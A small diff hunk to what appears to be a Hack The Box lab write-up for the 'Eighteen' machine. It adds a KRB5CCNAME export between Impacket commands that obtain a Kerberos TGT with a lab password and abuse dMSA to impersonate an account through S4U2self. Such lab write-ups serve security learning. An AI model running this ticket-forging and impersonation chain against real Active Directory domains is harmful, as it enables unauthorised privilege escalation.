@@ -246,6 +246,8 @@ The final stage of the attack involved getting `adam.scott`'s `TGT` and abusing 
 ~/HTB/Windows/Eighteen $ getTGT.py eighteen.htb/adam.scott:iloveyou1
 [*] Saving ticket in adam.scott.ccache
 
+~/HTB/Windows/Eighteen $ export KRB5CCNAME=adam.scott.ccache
+
 ~/HTB/Windows/Eighteen $ getST.py -k -no-pass -dmsa eighteen.htb/adam.scott -impersonate 'exploit$' -self
 [*] Impersonating exploit$
 [*] Requesting S4U2self
